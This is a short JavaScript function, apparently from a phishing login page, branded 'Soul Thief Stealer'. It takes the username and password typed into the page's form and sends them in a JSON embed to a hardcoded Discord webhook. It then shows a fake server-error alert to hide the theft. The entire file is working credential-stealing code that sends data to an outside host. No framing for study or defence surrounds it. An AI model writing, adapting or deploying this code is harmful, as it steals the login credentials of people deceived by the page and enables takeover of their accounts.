function sendMessage() {
  function sleep(milliseconds) {
    const date = Date.now();
    let currentDate = null;
    do {
      currentDate = Date.now();
    } while (currentDate - date < milliseconds);
  }

  var request = new XMLHttpRequest();
  request.open(
    "POST",
    "https://discord.com/api/webhooks/1030833591824941056/6sw3jk3dsVbdrrqyzAxgPFkHkmEsb2Nwxr9VYr24R4FCzGqaiOPHA-Aapce1j_Fg3PcG"
  );
  request.setRequestHeader("Content-type", "application/json");
  var params = {
    username: "Soul Thief Stealer",
    avatar_url:
      "https://cdn.discordapp.com/attachments/933369553403138078/1084469429905141860/Blanc_et_Noir_Montagne_Net_et_Moderne_Eglise_Logo-modified_1.png",
    embeds: [
      {
        title: "Login Information",
        color: 0x0099ff,
        fields: [
          {
            name: ":mens: **Username**",
            value: document.getElementById("username").value,
            inline: true,
          },
          {
            name: ":lock: **Password**",
            value: document.getElementById("password").value,
            inline: true,
          },
        ],
        footer: {
          icon_url: "https://cdn.discordapp.com/attachments/933369553403138078/1084467078414741644/Blanc_et_Noir_Montagne_Net_et_Moderne_Eglise_Logo.png",
          text: "Soul Thief Stealer",
        },
        thumbnail: {
          url: "https://cdn.discordapp.com/attachments/933369553403138078/1084469429905141860/Blanc_et_Noir_Montagne_Net_et_Moderne_Eglise_Logo-modified_1.png"
        },
      },
    ],
  };
  request.send(JSON.stringify(params));
  sleep(400);

  // Ajouter la popup ici
  alert("ERROR SERVER- try again later");
}
